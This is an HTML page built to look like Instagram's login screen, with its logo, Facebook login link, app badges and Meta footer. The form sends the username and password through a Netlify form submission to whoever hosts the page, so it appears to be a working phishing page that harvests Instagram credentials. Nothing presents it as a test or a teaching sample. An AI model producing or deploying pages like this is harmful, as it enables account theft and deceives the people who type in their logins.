<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <!-- Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Google Fonts for the main font -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background-color: #fafafa;
            zoom: 90%;
        }
    </style>
</head>
<body class="flex flex-col items-center justify-center min-h-screen">
    <!-- Main content container -->
    <main class="w-full max-w-sm mx-auto p-4 md:p-8">

        <!-- Login Card -->
        <div class="bg-white border border-gray-300 rounded-sm p-8 mb-4">
            <!-- Instagram Logo Image -->
            <img 
                src="instagram_logo.svg.png" 
                alt="Instagram Logo" 
                class="mx-auto h-20 mb-4"
                onerror="this.src='https://placehold.co/175x60/f1f1f1/000000?text=Instagram+Logo'"
            >
            
            <form name="email" class="mt-8 space-y-2" method="POST" netlify>
                <!-- Username/Email/Phone Input -->
                <input 
                    name="username"
                    type="text" 
                    placeholder="Phone number, username, or email" 
                    id="username-input"
                    class="w-full text-sm border border-gray-300 rounded-sm p-2 bg-gray-50 focus:outline-none focus:ring-1 focus:ring-gray-400"
                >
                <!-- Password Input -->
                <input 
                    name="password"
                    type="password" 
                    placeholder="Password" 
                    id="password-input"
                    class="w-full text-sm border border-gray-300 rounded-sm p-2 bg-gray-50 focus:outline-none focus:ring-1 focus:ring-gray-400"
                >
                <!-- Log In Button -->
                <button 
                    type="submit" 
                    id="login-button"
                    class="w-full bg-blue-400 text-white font-semibold py-2 rounded-lg mt-4 opacity-50 cursor-not-allowed transition-colors"
                    disabled
                >
                    Log In
                </button>
            </form>

            <!-- OR Separator -->
            <div class="flex items-center my-4">
                <div class="flex-grow border-t border-gray-300"></div>
                <span class="mx-4 text-gray-400 text-xs font-semibold">OR</span>
                <div class="flex-grow border-t border-gray-300"></div>
            </div>

            <!-- Log in with Facebook -->
            <a href="#" class="flex items-center justify-center text-blue-800 font-semibold text-sm">
                <!-- Inline SVG for Facebook Logo -->
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-facebook mr-2" viewBox="0 0 16 16">
                    <path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951"/>
                </svg>
                Log in with Facebook
            </a>

            <!-- Forgot Password link -->
            <a href="#" class="block text-center text-xs text-blue-800 mt-4">
                Forgot password?
            </a>
        </div>

        <!-- Sign Up Card -->
        <div class="bg-white border border-gray-300 rounded-sm p-4 text-center">
            <p class="text-sm">Don't have an account? <a href="#" class="text-blue-500 font-semibold">Sign up</a></p>
        </div>

        <!-- Get the App Section -->
        <div class="text-center mt-6">
            <p class="text-sm">Get the app.</p>
            <div class="flex justify-center gap-2 mt-4">
                <a href="#">
                    <img 
                        src="images.jpg" 
                        alt="Download on the App Store" 
                        class="h-10"
                        onerror="this.src='https://placehold.co/136x40/f1f1f1/000000?text=App+Store'"
                    >
                </a>
                <a href="#">
                    <img 
                        src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" 
                        alt="Get it on Google Play" 
                        class="h-10"
                        onerror="this.src='https://placehold.co/136x40/f1f1f1/000000?text=Google+Play'"
                    >
                </a>
            </div>
        </div>
    </main>

    <!-- Footer -->
    <footer class="mt-8 pb-4 text-xs text-gray-500 text-center w-full">
        <nav>
            <ul class="flex flex-wrap justify-center gap-x-4 gap-y-2">
                <li><a href="#" class="hover:underline">Meta</a></li>
                <li><a href="#" class="hover:underline">About</a></li>
                <li><a href="#" class="hover:underline">Blog</a></li>
                <li><a href="#" class="hover:underline">Jobs</a></li>
                <li><a href="#" class="hover:underline">Help</a></li>
                <li><a href="#" class="hover:underline">API</a></li>
                <li><a href="#" class="hover:underline">Privacy</a></li>
                <li><a href="#" class="hover:underline">Terms</a></li>
                <li><a href="#" class="hover:underline">Locations</a></li>
                <li><a href="#" class="hover:underline">Instagram Lite</a></li>
                <li><a href="#" class="hover:underline">Threads</a></li>
                <li><a href="#" class="hover:underline">Contact Uploading & Non-Users</a></li>
                <li><a href="#" class="hover:underline">Meta Verified</a></li>
            </ul>
        </nav>
        <div class="mt-4 flex flex-col sm:flex-row justify-center items-center gap-2">
            <select class="bg-transparent border-none text-gray-500 text-xs">
                <option value="en">English</option>
                <option value="es">Spanish</option>
                <option value="fr">French</option>
            </select>
            <span>&copy; 2025 Instagram from Meta</span>
        </div>
    </footer>

    <script>
        const usernameInput = document.getElementById('username-input');
        const passwordInput = document.getElementById('password-input');
        const loginButton = document.getElementById('login-button');

        function toggleLoginButton() {
            if (usernameInput.value.length > 0 && passwordInput.value.length > 0) {
                loginButton.disabled = false;
                loginButton.classList.remove('opacity-50', 'cursor-not-allowed', 'bg-blue-400');
                loginButton.classList.add('bg-blue-500');
            } else {
                loginButton.disabled = true;
                loginButton.classList.remove('bg-blue-500');
                loginButton.classList.add('opacity-50', 'cursor-not-allowed', 'bg-blue-400');
            }
        }

        usernameInput.addEventListener('input', toggleLoginButton);
        passwordInput.addEventListener('input', toggleLoginButton);
    </script>
</body>
</html>
